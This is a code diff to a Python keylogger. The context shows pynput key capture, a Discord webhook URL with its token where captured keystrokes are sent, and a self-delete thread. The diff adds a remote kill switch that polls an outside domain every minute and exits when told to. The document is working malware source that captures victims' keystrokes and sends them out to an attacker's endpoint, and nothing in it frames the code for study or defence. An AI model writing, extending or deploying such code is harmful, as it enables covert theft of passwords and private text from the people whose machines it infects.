@@ -20,6 +20,7 @@ from pynput import keyboard
 
 # --- Configuration ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1360081058351153152/qt2xAqDS6h58Qwu9BxIiRRZR04Xc4SMCsxLp-rCH0eLgS5HD6lpfHLUJ64155wFSFM6r"
+CHECK_URL = "http://shouldidie.fiscon.cc"
 
 key_buffer = []
 lock = threading.Lock()
@@ -72,6 +73,18 @@ def message_loop():
                 send_webhook(message)
                 key_buffer.clear()
 
+# --- Periodic shouldidie checker ---
+def check_should_i_die_loop():
+    while True:
+        time.sleep(60)  # Check every 60 seconds
+        try:
+            response = requests.get(CHECK_URL, timeout=10)
+            if response.status_code == 200 and response.text.strip().lower() == "yes":
+                print("Should die: yes. Exiting.")
+                os._exit(0)  # Immediate hard exit
+        except Exception as e:
+            print("Failed to check shouldidie:", e)
+
 # --- Keyboard listener thread ---
 def listen_keys():
     with keyboard.Listener(on_press=on_press) as listener:
@@ -81,4 +94,5 @@ def listen_keys():
 if __name__ == "__main__":
     threading.Thread(target=self_delete, daemon=True).start()
     threading.Thread(target=message_loop, daemon=True).start()
+    threading.Thread(target=check_should_i_die_loop, daemon=True).start()
     listen_keys()
